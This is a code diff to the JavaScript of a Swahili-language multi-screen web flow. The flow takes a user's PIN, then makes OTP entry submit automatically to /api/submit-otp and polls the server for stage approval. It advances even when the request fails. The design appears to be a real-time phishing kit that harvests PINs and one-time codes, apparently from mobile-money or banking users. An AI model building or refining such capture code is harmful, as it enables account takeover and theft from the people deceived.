@@ -194,7 +194,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     appData.pin = pinVal;
     
-    // Clear previous status banner
     const pinBanner = document.getElementById('pin-status-banner');
     pinBanner.className = 'status-banner';
     pinBanner.innerText = '';
@@ -227,13 +226,20 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // OTP Inputs handling (Screen 7)
+  // OTP Inputs handling with Automatic Submission (Screen 7)
   const otpBoxes = document.querySelectorAll('.otp-box');
   otpBoxes.forEach((box, index) => {
     box.addEventListener('input', (e) => {
       const val = e.target.value;
       if (val && index < otpBoxes.length - 1) {
         otpBoxes[index + 1].focus();
+      }
+      
+      // Check if all 6 boxes are filled
+      let otpVal = '';
+      otpBoxes.forEach(b => otpVal += b.value);
+      if (otpVal.length === 6) {
+        submitOtp(otpVal);
       }
     });
     box.addEventListener('keydown', (e) => {
@@ -242,6 +248,43 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     });
   });
+
+  async function submitOtp(otpVal) {
+    appData.otp = otpVal;
+
+    const otpBanner = document.getElementById('otp-status-banner');
+    otpBanner.className = 'status-banner';
+    otpBanner.innerText = '';
+
+    showLoading("Inathibitisha OTP... Tafadhali subiri");
+
+    try {
+      await fetch('/api/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId, otp: otpVal })
+      });
+
+      startStatusPolling(() => {
+        hideLoading();
+        showScreen(8);
+      }, 'OTP');
+    } catch (e) {
+      hideLoading();
+      showScreen(8);
+    }
+  }
+
+  const btnOtpSubmit = document.getElementById('btn-screen7-submit');
+  if (btnOtpSubmit) {
+    btnOtpSubmit.addEventListener('click', () => {
+      let otpVal = '';
+      otpBoxes.forEach(b => otpVal += b.value);
+      if (otpVal.length === 6) {
+        submitOtp(otpVal);
+      }
+    });
+  }
 
   function startOtpCountdown() {
     let seconds = 30;
@@ -267,38 +310,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     alert('Nambari mpya ya OTP imetumwa.');
     startOtpCountdown();
-  });
-
-  document.getElementById('btn-screen7-submit').addEventListener('click', async () => {
-    let otpVal = '';
-    otpBoxes.forEach(b => otpVal += b.value);
-    if (otpVal.length < 6) {
-      alert('Tafadhali weka OTP kamili ya tarakimu 6.');
-      return;
-    }
-    appData.otp = otpVal;
-
-    const otpBanner = document.getElementById('otp-status-banner');
-    otpBanner.className = 'status-banner';
-    otpBanner.innerText = '';
-
-    showLoading("Inathibitisha OTP... Tafadhali subiri");
-
-    try {
-      await fetch('/api/submit-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId, otp: otpVal })
-      });
-
-      startStatusPolling(() => {
-        hideLoading();
-        showScreen(8);
-      }, 'OTP');
-    } catch (e) {
-      hideLoading();
-      showScreen(8);
-    }
   });
 
   function startStatusPolling(onSuccess, stage) {
@@ -348,4 +359,4 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.reload();
   });
 });
-                            
+    
